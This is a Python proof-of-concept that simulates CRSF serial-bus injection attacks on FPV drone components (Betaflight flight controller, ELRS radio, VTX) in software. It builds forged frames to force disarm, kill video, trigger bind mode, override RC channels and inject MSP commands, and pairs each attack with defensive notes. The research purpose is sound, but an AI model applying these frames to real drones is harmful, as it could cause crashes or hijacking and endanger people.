#!/usr/bin/env python3
"""CRSF serial bus injection proof-of-concept for SITL validation.

Simulates CRSF serial bus injection attacks in software, validating
frame construction, CRC integrity, routing, and attack scenarios
against a virtual CRSF bus. No hardware or RF required.

Attack scenarios validated:
  1. Device ping enumeration (type 0x28)
  2. Parameter read to extract binding UID (type 0x2C)
  3. Parameter write to force WiFi mode entry (type 0x2D)
  4. Force disarm via command frame (type 0x32, cmd 0x01)
  5. VTX pit-mode to kill video (type 0x32, cmd 0x08)
  6. Bind command to disrupt RF link (type 0x32, cmd 0x10)
  7. RC channel override with forged 0x16 frames
  8. MSP passthrough injection (type 0x7A)

The virtual bus models how Betaflight and ELRS process CRSF frames:
  - Frame CRC validation (poly 0xD5)
  - Command CRC validation (poly 0xBA)
  - Address-based routing
  - Extended frame dest/origin handling
  - Frame size limits (max 64 bytes)

Usage:
  python3 crsf-injection-poc.py                    # Run all scenarios
  python3 crsf-injection-poc.py --scenario disarm   # Run one scenario
  python3 crsf-injection-poc.py --list              # List scenarios
  python3 crsf-injection-poc.py --json              # JSON output

For authorized security research only. See SECURITY.md.
"""

from __future__ import annotations

import argparse
import json
import sys
import time
from dataclasses import dataclass, field
from enum import IntEnum
from typing import Optional

# ---------------------------------------------------------------------------
# Import the existing CRSF frame library
# ---------------------------------------------------------------------------

import importlib.util as _ilu
_tools_dir = str(__import__("pathlib").Path(__file__).resolve().parent)
sys.path.insert(0, _tools_dir)

def _import_crsf_packet_tool():
    spec = _ilu.spec_from_file_location(
        "crsf_packet_tool",
        __import__("pathlib").Path(__file__).resolve().parent / "crsf-packet-tool.py",
    )
    mod = _ilu.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod

_cpt = _import_crsf_packet_tool()

ADDRESSES = _cpt.ADDRESSES
FRAME_TYPES = _cpt.FRAME_TYPES
CRC8_BA = _cpt.CRC8_BA
CRC8_D5 = _cpt.CRC8_D5
CRSFFrame = _cpt.CRSFFrame
build_command = _cpt.build_command
build_device_ping = _cpt.build_device_ping
build_frame = _cpt.build_frame
build_rc_channels = _cpt.build_rc_channels
crc8 = _cpt.crc8
crc8_command = _cpt.crc8_command
crc8_frame = _cpt.crc8_frame
encode_channels = _cpt.encode_channels
parse_all = _cpt.parse_all
parse_frame = _cpt.parse_frame


# ---------------------------------------------------------------------------
# CRSF address and frame type enums for clarity
# ---------------------------------------------------------------------------

class Addr(IntEnum):
    BROADCAST = 0x00
    USB = 0x10
    BT_WIFI = 0x12
    FLIGHT_CONTROLLER = 0xC8
    VTX = 0xCE
    RADIO_TX = 0xEA
    RECEIVER = 0xEC
    TRANSMITTER = 0xEE


class FrameType(IntEnum):
    GPS = 0x02
    BATTERY = 0x08
    LINK_STATS = 0x14
    RC_CHANNELS = 0x16
    ATTITUDE = 0x1E
    FLIGHT_MODE = 0x21
    DEVICE_PING = 0x28
    DEVICE_INFO = 0x29
    PARAM_ENTRY = 0x2B
    PARAM_READ = 0x2C
    PARAM_WRITE = 0x2D
    COMMAND = 0x32
    MSP_REQUEST = 0x7A
    MSP_RESPONSE = 0x7B
    MSP_WRITE = 0x7C


# ---------------------------------------------------------------------------
# Virtual CRSF bus device
# ---------------------------------------------------------------------------

@dataclass
class BusEvent:
    """A recorded event on the virtual CRSF bus."""
    timestamp: float
    direction: str  # "tx" or "rx"
    source: str
    frame: CRSFFrame
    accepted: bool
    rejection_reason: Optional[str] = None


@dataclass
class VirtualDevice:
    """A device on the virtual CRSF bus."""
    name: str
    address: int
    accepts_broadcast: bool = True
    armed: bool = False
    wifi_mode: bool = False
    binding: bool = False
    vtx_pit_mode: bool = False
    params: dict = field(default_factory=dict)
    device_info: bytes = b""
    log: list[str] = field(default_factory=list)

    def accepts_frame(self, frame: CRSFFrame) -> tuple[bool, str]:
        """Check if this device would accept the frame."""
        if not frame.crc_valid:
            return False, "invalid frame CRC"

        if frame.is_extended:
            dest = frame.dest
            if dest is None:
                return False, "missing destination"
            if dest != self.address and dest != Addr.BROADCAST:
                return False, f"wrong destination 0x{dest:02X}"

        if frame.frame_type == FrameType.COMMAND:
            ip = frame.inner_payload
            if len(ip) < 2:
                return False, "command frame too short"
            cmd_data = bytes([frame.frame_type]) + frame.payload[:2] + ip[:-1]
            expected_cmd_crc = crc8(cmd_data, CRC8_BA)
            actual_cmd_crc = ip[-1]
            if actual_cmd_crc != expected_cmd_crc:
                return False, "invalid command CRC"

        return True, "accepted"


class VirtualCRSFBus:
    """Simulates a CRSF serial bus with multiple devices.

    Models the key behaviors:
    - Frame CRC checking
    - Address-based routing
    - Command CRC double-check
    - Device state changes from accepted commands
    """

    def __init__(self):
        self.devices: dict[int, VirtualDevice] = {}
        self.events: list[BusEvent] = []
        self._start_time = time.monotonic()

        self._setup_default_devices()

    def _setup_default_devices(self):
        fc = VirtualDevice(
            name="Betaflight FC (STM32F411)",
            address=Addr.FLIGHT_CONTROLLER,
            params={
                "board_name": "EMAX_TINYHAWKF4SX1280",
                "firmware": "Betaflight 4.4.2",
                "msp_api": "1.45",
            },
            device_info=self._make_device_info(
                "Betaflight", serial=b"\x00\x01\x02\x03",
                hw_id=0x0411F4E1, fw_id=0x04040200,
            ),
        )
        self.devices[Addr.FLIGHT_CONTROLLER] = fc

        rx = VirtualDevice(
            name="ELRS Receiver (SX1280)",
            address=Addr.RECEIVER,
            params={
                "rate": "500Hz",
                "power": "25mW",
                "binding_uid": "[REDACTED]",
                "wifi_mode": "off",
                "ota_version": "3",
            },
            device_info=self._make_device_info(
                "ELRS RX", serial=b"\xAA\xBB\xCC\xDD",
                hw_id=0x12800001, fw_id=0x03010000,
            ),
        )
        self.devices[Addr.RECEIVER] = rx

        tx = VirtualDevice(
            name="ELRS Transmitter Module",
            address=Addr.TRANSMITTER,
            params={
                "rate": "500Hz",
                "power": "100mW",
                "binding_uid": "[REDACTED]",
            },
            device_info=self._make_device_info(
                "ELRS TX", serial=b"\x11\x22\x33\x44",
                hw_id=0x12800002, fw_id=0x03010000,
            ),
        )
        self.devices[Addr.TRANSMITTER] = tx

        vtx = VirtualDevice(
            name="VTX (SmartAudio)",
            address=Addr.VTX,
            params={
                "channel": "R1",
                "power": "200mW",
                "pit_mode": "off",
            },
            device_info=self._make_device_info(
                "SmartAudio VTX", serial=b"\x55\x66\x77\x88",
                hw_id=0x00CE0001, fw_id=0x00020000,
            ),
        )
        self.devices[Addr.VTX] = vtx

    @staticmethod
    def _make_device_info(name: str, serial: bytes, hw_id: int, fw_id: int) -> bytes:
        import struct
        name_bytes = name.encode("ascii") + b"\x00"
        return name_bytes + serial + struct.pack(">II", hw_id, fw_id) + b"\x00\x00\x00\x00"

    def inject(self, frame_bytes: bytes, source: str = "attacker") -> list[BusEvent]:
        """Inject raw bytes onto the bus. Returns events for each device."""
        frames = parse_all(frame_bytes)
        events = []

        for frame in frames:
            for addr, device in self.devices.items():
                accepted, reason = device.accepts_frame(frame)
                evt = BusEvent(
                    timestamp=time.monotonic() - self._start_time,
                    direction="tx",
                    source=source,
                    frame=frame,
                    accepted=accepted,
                    rejection_reason=None if accepted else reason,
                )
                events.append(evt)
                self.events.append(evt)

                if accepted:
                    self._process_frame(device, frame)

        return events

    def _process_frame(self, device: VirtualDevice, frame: CRSFFrame):
        """Simulate device state changes from accepted frames."""
        ft = frame.frame_type

        if ft == FrameType.DEVICE_PING:
            device.log.append("Received device ping — would respond with device info")

        elif ft == FrameType.PARAM_READ:
            ip = frame.inner_payload
            if len(ip) >= 2:
                param_idx = ip[0]
                chunk_idx = ip[1]
                device.log.append(
                    f"Parameter read request: index={param_idx}, chunk={chunk_idx}"
                )

        elif ft == FrameType.PARAM_WRITE:
            ip = frame.inner_payload
            if len(ip) >= 2:
                param_idx = ip[0]
                value = ip[1:]
                device.log.append(
                    f"Parameter write: index={param_idx}, value={value.hex()}"
                )
                if device.address == Addr.RECEIVER and param_idx == 0xFF:
                    device.wifi_mode = True
                    device.log.append("WiFi mode ACTIVATED via parameter write")

        elif ft == FrameType.COMMAND:
            ip = frame.inner_payload
            if len(ip) >= 2:
                cmd_id = ip[0]
                sub_payload = ip[1:-1]

                if cmd_id == 0x01 and device.address == Addr.FLIGHT_CONTROLLER:
                    if sub_payload == b"\x00":
                        device.armed = False
                        device.log.append("FORCE DISARM executed via command 0x01")
                    elif sub_payload == b"\x01":
                        device.armed = True
                        device.log.append("FORCE ARM executed via command 0x01")

                elif cmd_id == 0x08 and device.address == Addr.VTX:
                    device.vtx_pit_mode = True
                    device.log.append("VTX PIT MODE activated via command 0x08")

                elif cmd_id == 0x10:
                    if sub_payload[:1] == b"\x01":
                        device.binding = True
                        device.log.append("BIND MODE triggered via command 0x10")

        elif ft == FrameType.RC_CHANNELS:
            if device.address == Addr.FLIGHT_CONTROLLER:
                device.log.append("RC channels injected — FC would apply to mixer")

        elif ft == FrameType.MSP_REQUEST:
            if device.address == Addr.FLIGHT_CONTROLLER:
                ip = frame.inner_payload
                device.log.append(
                    f"MSP request injected: {ip.hex() if ip else 'empty'}"
                )


# ---------------------------------------------------------------------------
# Attack scenarios
# ---------------------------------------------------------------------------

@dataclass
class ScenarioResult:
    name: str
    description: str
    attack_type: str
    frames_injected: int
    frames_accepted: int
    state_changes: list[str]
    defense_notes: list[str]
    frame_hex: list[str]
    success: bool

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "description": self.description,
            "attack_type": self.attack_type,
            "frames_injected": self.frames_injected,
            "frames_accepted": self.frames_accepted,
            "state_changes": self.state_changes,
            "defense_notes": self.defense_notes,
            "frame_hex": self.frame_hex,
            "success": self.success,
        }


def scenario_device_ping(bus: VirtualCRSFBus) -> ScenarioResult:
    """Scenario 1: Device ping enumeration.

    Send a broadcast device ping to discover all devices on the CRSF bus.
    This is the zero-risk first step — a device ping is a normal CRSF
    operation and reveals device names, serial numbers, HW/FW IDs.
    """
    frame = build_device_ping()
    events = bus.inject(frame, source="attacker")

    accepted = [e for e in events if e.accepted]
    state_changes = []
    for addr, dev in bus.devices.items():
        for entry in dev.log:
            if "ping" in entry.lower():
                state_changes.append(f"{dev.name}: {entry}")

    return ScenarioResult(
        name="device_ping",
        description="Broadcast device ping to enumerate CRSF bus devices",
        attack_type="reconnaissance",
        frames_injected=1,
        frames_accepted=len(accepted),
        state_changes=state_changes,
        defense_notes=[
            "Device ping is a legitimate CRSF operation — hard to block",
            "Detection: monitor for pings from unexpected origins (not 0xEA/0xEE)",
            "The ping origin 0xEA impersonates the radio handset",
            "Response reveals device name, serial, HW/FW version — information leak",
        ],
        frame_hex=[frame.hex(" ")],
        success=len(accepted) > 0,
    )


def scenario_param_read(bus: VirtualCRSFBus) -> ScenarioResult:
    """Scenario 2: Parameter read to extract binding UID.

    CRSF parameter read frames (0x2C) can request any device parameter.
    On ELRS receivers, this includes the binding UID, rate config, and
    power settings. No authentication is required.
    """
    payload = bytes([Addr.RECEIVER, Addr.TRANSMITTER, 0x01, 0x00])
    frame = build_frame(FrameType.PARAM_READ, payload)
    events = bus.inject(frame, source="attacker")

    accepted = [e for e in events if e.accepted]
    state_changes = []
    for dev in bus.devices.values():
        for entry in dev.log:
            if "parameter read" in entry.lower():
                state_changes.append(f"{dev.name}: {entry}")

    return ScenarioResult(
        name="param_read",
        description="Parameter read request to extract receiver config (binding UID)",
        attack_type="information_disclosure",
        frames_injected=1,
        frames_accepted=len(accepted),
        state_changes=state_changes,
        defense_notes=[
            "Parameter reads are normal during TX↔RX configuration",
            "Detection: parameter reads from non-TX origins are suspicious",
            "ELRS does not authenticate parameter read requests",
            "Binding UID extraction enables full FHSS sequence computation",
            "Mitigation: filter parameter reads to only accept from bound TX address",
        ],
        frame_hex=[frame.hex(" ")],
        success=len(accepted) > 0,
    )


def scenario_wifi_mode_entry(bus: VirtualCRSFBus) -> ScenarioResult:
    """Scenario 3: Force WiFi mode entry via parameter write.

    CRSF parameter write (0x2D) can set the receiver into WiFi mode,
    which disconnects the RF link and exposes a WiFi AP for firmware
    update. This is the master plan's identified zero-risk E8 USB test.

    On a real ELRS receiver, the WiFi mode parameter index varies by
    firmware version. We use 0xFF as a placeholder.
    """
    payload = bytes([Addr.RECEIVER, Addr.TRANSMITTER, 0xFF, 0x01])
    frame = build_frame(FrameType.PARAM_WRITE, payload)
    events = bus.inject(frame, source="attacker")

    accepted = [e for e in events if e.accepted]
    state_changes = []
    rx = bus.devices.get(Addr.RECEIVER)
    wifi_activated = False
    if rx:
        for entry in rx.log:
            if "wifi" in entry.lower():
                state_changes.append(f"{rx.name}: {entry}")
                if "activated" in entry.lower():
                    wifi_activated = True

    return ScenarioResult(
        name="wifi_mode_entry",
        description="Force WiFi mode entry on receiver via CRSF parameter write",
        attack_type="denial_of_service",
        frames_injected=1,
        frames_accepted=len(accepted),
        state_changes=state_changes,
        defense_notes=[
            "WiFi mode entry disconnects the RF control link — immediate loss of control",
            "The receiver exposes a WiFi AP, potentially with weak/no authentication",
            "Detection: unexpected parameter writes to WiFi mode index",
            "Mitigation: require button press confirmation for WiFi mode",
            "ELRS 3.5+ added a 'WiFi mode entry' confirmation for some configs",
            "This is the master plan's identified CRSF-over-E8-USB pathway",
        ],
        frame_hex=[frame.hex(" ")],
        success=wifi_activated,
    )


def scenario_force_disarm(bus: VirtualCRSFBus) -> ScenarioResult:
    """Scenario 4: Force disarm via CRSF command frame.

    Command frame 0x32 with command ID 0x01 (FC commands) can force
    the flight controller to disarm. Betaflight accepts this based on
    CRC alone — no authentication, no origin verification.
    """
    fc = bus.devices.get(Addr.FLIGHT_CONTROLLER)
    if fc:
        fc.armed = True
        fc.log.clear()

    frame = build_command(
        dest=Addr.FLIGHT_CONTROLLER,
        origin=Addr.TRANSMITTER,
        cmd_id=0x01,
        sub_payload=b"\x00",
    )
    events = bus.inject(frame, source="attacker")

    accepted = [e for e in events if e.accepted]
    state_changes = []
    disarmed = False
    if fc:
        for entry in fc.log:
            state_changes.append(f"{fc.name}: {entry}")
            if "disarm" in entry.lower():
                disarmed = True

    return ScenarioResult(
        name="force_disarm",
        description="Force disarm flight controller via CRSF command 0x32.0x01",
        attack_type="denial_of_service",
        frames_injected=1,
        frames_accepted=len(accepted),
        state_changes=state_changes,
        defense_notes=[
            "Force disarm is accepted with CRC validation only — zero authentication",
            "Any device on the CRSF bus can disarm the FC",
            "Detection: command 0x32.0x01 from non-TX origin is always malicious",
            "Mitigation: Betaflight could verify origin matches bound TX serial",
            "Impact: immediate motor shutdown — catastrophic if in flight",
            "CVE-2026-32706 (PX4) shows this class of attack is recognized",
        ],
        frame_hex=[frame.hex(" ")],
        success=disarmed,
    )


def scenario_vtx_pitmode(bus: VirtualCRSFBus) -> ScenarioResult:
    """Scenario 5: VTX pit mode to kill video feed.

    Command 0x32 with command ID 0x08 (VTX) can force the video
    transmitter into pit mode, effectively killing the FPV video feed.
    """
    frame = build_command(
        dest=Addr.VTX,
        origin=Addr.TRANSMITTER,
        cmd_id=0x08,
        sub_payload=b"\x04\x01",
    )
    events = bus.inject(frame, source="attacker")

    accepted = [e for e in events if e.accepted]
    state_changes = []
    vtx = bus.devices.get(Addr.VTX)
    pit_activated = False
    if vtx:
        for entry in vtx.log:
            state_changes.append(f"{vtx.name}: {entry}")
            if "pit" in entry.lower():
                pit_activated = True

    return ScenarioResult(
        name="vtx_pitmode",
        description="Force VTX into pit mode to kill FPV video feed",
        attack_type="denial_of_service",
        frames_injected=1,
        frames_accepted=len(accepted),
        state_changes=state_changes,
        defense_notes=[
            "VTX commands via CRSF are standard SmartAudio/Tramp protocol",
            "Detection: VTX commands from non-FC origin are suspicious",
            "Impact: pilot loses FPV video — must fly line-of-sight or failsafe",
            "Mitigation: VTX could require FC intermediation for commands",
        ],
        frame_hex=[frame.hex(" ")],
        success=pit_activated,
    )


def scenario_bind_disrupt(bus: VirtualCRSFBus) -> ScenarioResult:
    """Scenario 6: Trigger bind mode to disrupt RF link.

    Command 0x32 with command ID 0x10 (Crossfire) sub-command 0x01
    triggers bind mode on the receiver. This disrupts the active RF
    link and puts the receiver into a vulnerable binding state.
    """
    frame = build_command(
        dest=Addr.RECEIVER,
        origin=Addr.TRANSMITTER,
        cmd_id=0x10,
        sub_payload=b"\x01",
    )
    events = bus.inject(frame, source="attacker")

    accepted = [e for e in events if e.accepted]
    state_changes = []
    rx = bus.devices.get(Addr.RECEIVER)
    bind_triggered = False
    if rx:
        for entry in rx.log:
            state_changes.append(f"{rx.name}: {entry}")
            if "bind" in entry.lower():
                bind_triggered = True

    return ScenarioResult(
        name="bind_disrupt",
        description="Trigger bind mode on receiver to disrupt RF link",
        attack_type="denial_of_service",
        frames_injected=1,
        frames_accepted=len(accepted),
        state_changes=state_changes,
        defense_notes=[
            "Bind mode disconnects the active TX↔RX RF link",
            "An attacker could then bind their own TX to the receiver",
            "Detection: bind command from serial bus during active flight is anomalous",
            "Mitigation: ignore bind commands while armed or while link quality > 0",
            "ELRS bind uses a shared phrase — receiver would need attacker's phrase",
        ],
        frame_hex=[frame.hex(" ")],
        success=bind_triggered,
    )


def scenario_rc_override(bus: VirtualCRSFBus) -> ScenarioResult:
    """Scenario 7: RC channel override with forged frames.

    Inject RC channel frames (type 0x16) with attacker-chosen stick
    values. If the FC accepts these alongside or instead of legitimate
    frames, the attacker controls the drone.
    """
    channels = [1500.0] * 4 + [1000.0] * 12
    channels[2] = 1000.0  # throttle min
    channels[4] = 1000.0  # AUX1 (arm switch) = disarmed

    frame = build_rc_channels(channels)
    events = bus.inject(frame, source="attacker")

    accepted = [e for e in events if e.accepted]
    state_changes = []
    fc = bus.devices.get(Addr.FLIGHT_CONTROLLER)
    if fc:
        for entry in fc.log:
            if "rc channel" in entry.lower():
                state_changes.append(f"{fc.name}: {entry}")

    return ScenarioResult(
        name="rc_override",
        description="Inject forged RC channel frames to override stick inputs",
        attack_type="commandeering",
        frames_injected=1,
        frames_accepted=len(accepted),
        state_changes=state_changes,
        defense_notes=[
            "RC override is the highest-impact CRSF injection attack",
            "On serial bus, FC treats all valid 0x16 frames equally — no origin check",
            "Detection: two sources of 0x16 frames (legitimate RX + attacker) cause jitter",
            "Detection: RC channel value jumps between attacker and pilot inputs",
            "Mitigation: FC could track frame timing and reject out-of-sequence frames",
            "Over RF: requires FHSS sync and timing — much harder than serial injection",
        ],
        frame_hex=[frame.hex(" ")],
        success=len(accepted) > 0,
    )


def scenario_msp_passthrough(bus: VirtualCRSFBus) -> ScenarioResult:
    """Scenario 8: MSP command injection via CRSF passthrough.

    CRSF frame types 0x7A (MSP request) and 0x7C (MSP write) allow
    arbitrary Betaflight MSP commands through the CRSF serial link.
    This could read or modify any FC configuration.
    """
    # MSP_API_VERSION request (MSP command 1) — minimal safe probe
    msp_cmd = 1
    msp_payload = bytes([
        Addr.FLIGHT_CONTROLLER,
        Addr.TRANSMITTER,
        0x00,  # flags
        msp_cmd & 0xFF,
        (msp_cmd >> 8) & 0xFF,
    ])
    frame = build_frame(FrameType.MSP_REQUEST, msp_payload)
    events = bus.inject(frame, source="attacker")

    accepted = [e for e in events if e.accepted]
    state_changes = []
    fc = bus.devices.get(Addr.FLIGHT_CONTROLLER)
    if fc:
        for entry in fc.log:
            if "msp" in entry.lower():
                state_changes.append(f"{fc.name}: {entry}")

    return ScenarioResult(
        name="msp_passthrough",
        description="Inject MSP commands via CRSF passthrough to read/modify FC config",
        attack_type="information_disclosure",
        frames_injected=1,
        frames_accepted=len(accepted),
        state_changes=state_changes,
        defense_notes=[
            "MSP-over-CRSF is how ELRS Lua scripts configure Betaflight",
            "No authentication — any CRSF bus participant can send MSP",
            "MSP_RX_CONFIG (command 44) returns binding UID",
            "MSP_SET_RX_CONFIG can modify receiver settings",
            "Detection: MSP requests from non-TX origin, or unusual MSP commands",
            "Mitigation: whitelist specific MSP commands over CRSF",
            "INAV CVE: MSP_DATAFLASH_READ can overrun response buffer (fixed 10.0.0-rc1)",
        ],
        frame_hex=[frame.hex(" ")],
        success=len(accepted) > 0,
    )


# ---------------------------------------------------------------------------
# CRC validation scenarios (defensive)
# ---------------------------------------------------------------------------

def scenario_crc_tamper(bus: VirtualCRSFBus) -> ScenarioResult:
    """Defensive scenario: verify CRC rejection.

    Inject frames with intentionally bad CRCs to confirm the bus
    correctly rejects them. This validates defensive detection.
    """
    good_frame = build_device_ping()
    bad_frame = bytearray(good_frame)
    bad_frame[-1] ^= 0xFF  # corrupt CRC
    bad_frame = bytes(bad_frame)

    good_events = bus.inject(good_frame, source="validator")
    bad_events = bus.inject(bad_frame, source="validator")

    good_accepted = sum(1 for e in good_events if e.accepted)
    bad_accepted = sum(1 for e in bad_events if e.accepted)
    bad_rejected = sum(1 for e in bad_events if not e.accepted)

    return ScenarioResult(
        name="crc_tamper",
        description="Verify CRC validation rejects tampered frames",
        attack_type="defensive_validation",
        frames_injected=2,
        frames_accepted=good_accepted,
        state_changes=[
            f"Good frame: {good_accepted} devices accepted",
            f"Bad frame: {bad_rejected} devices rejected, {bad_accepted} accepted",
        ],
        defense_notes=[
            "CRC-8 poly 0xD5 detects accidental corruption but not deliberate forgery",
            "An attacker who knows the polynomial can compute valid CRCs",
            "CRC is error detection, not authentication",
            "Defense must look at frame content and origin, not just CRC validity",
        ],
        frame_hex=[good_frame.hex(" "), bad_frame.hex(" ")],
        success=bad_accepted == 0 and good_accepted > 0,
    )


# ---------------------------------------------------------------------------
# Scenario registry
# ---------------------------------------------------------------------------

SCENARIOS = {
    "device_ping": scenario_device_ping,
    "param_read": scenario_param_read,
    "wifi_mode_entry": scenario_wifi_mode_entry,
    "force_disarm": scenario_force_disarm,
    "vtx_pitmode": scenario_vtx_pitmode,
    "bind_disrupt": scenario_bind_disrupt,
    "rc_override": scenario_rc_override,
    "msp_passthrough": scenario_msp_passthrough,
    "crc_tamper": scenario_crc_tamper,
}


# ---------------------------------------------------------------------------
# Execution
# ---------------------------------------------------------------------------

def run_scenario(name: str) -> ScenarioResult:
    """Run a single scenario on a fresh bus."""
    bus = VirtualCRSFBus()
    fn = SCENARIOS[name]
    return fn(bus)


def run_all_scenarios() -> list[ScenarioResult]:
    """Run all scenarios, each on a fresh bus."""
    results = []
    for name in SCENARIOS:
        results.append(run_scenario(name))
    return results


def print_result(result: ScenarioResult, *, verbose: bool = True):
    """Print a scenario result in human-readable format."""
    status = "PASS" if result.success else "FAIL"
    print(f"\n{'='*70}")
    print(f"  [{status}] {result.name}: {result.description}")
    print(f"{'='*70}")
    print(f"  Attack type:      {result.attack_type}")
    print(f"  Frames injected:  {result.frames_injected}")
    print(f"  Frames accepted:  {result.frames_accepted}")

    if result.state_changes:
        print(f"\n  State changes:")
        for sc in result.state_changes:
            print(f"    - {sc}")

    if verbose and result.frame_hex:
        print(f"\n  Injected frame(s):")
        for fh in result.frame_hex:
            print(f"    {fh}")

    if result.defense_notes:
        print(f"\n  Defensive analysis:")
        for dn in result.defense_notes:
            print(f"    - {dn}")


def main():
    parser = argparse.ArgumentParser(
        description="CRSF serial bus injection PoC — SITL validation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--scenario", "-s",
        choices=list(SCENARIOS.keys()),
        help="Run a specific scenario",
    )
    parser.add_argument(
        "--list", "-l", action="store_true",
        help="List available scenarios",
    )
    parser.add_argument(
        "--json", "-j", action="store_true",
        help="Output results as JSON",
    )
    parser.add_argument(
        "--quiet", "-q", action="store_true",
        help="Suppress verbose output",
    )
    args = parser.parse_args()

    if args.list:
        print("Available CRSF injection scenarios:")
        for name, fn in SCENARIOS.items():
            doc = fn.__doc__ or ""
            first_line = doc.strip().split("\n")[0] if doc else name
            print(f"  {name:20s} {first_line}")
        return

    if args.scenario:
        results = [run_scenario(args.scenario)]
    else:
        results = run_all_scenarios()

    if args.json:
        print(json.dumps([r.to_dict() for r in results], indent=2))
        return

    print("CRSF Serial Bus Injection PoC — SITL Validation")
    print("=" * 70)
    print("Virtual bus: FC + RX + TX + VTX (models TinyHawk III Plus)")
    print("All validation is software-only — no hardware or RF involved")

    for result in results:
        print_result(result, verbose=not args.quiet)

    passed = sum(1 for r in results if r.success)
    total = len(results)
    print(f"\n{'='*70}")
    print(f"  Results: {passed}/{total} scenarios validated successfully")
    print(f"{'='*70}")

    if passed == total:
        print("\n  All injection scenarios demonstrate the CRSF bus's lack of")
        print("  authentication. Any device with serial bus access can:")
        print("    1. Enumerate all connected devices")
        print("    2. Read any device parameter (including binding UID)")
        print("    3. Force WiFi mode (disconnect RF link)")
        print("    4. Force disarm (kill motors)")
        print("    5. Control VTX (kill video)")
        print("    6. Trigger bind mode (disrupt pairing)")
        print("    7. Override RC channels (commandeer the drone)")
        print("    8. Inject MSP commands (full FC config access)")


if __name__ == "__main__":
    main()
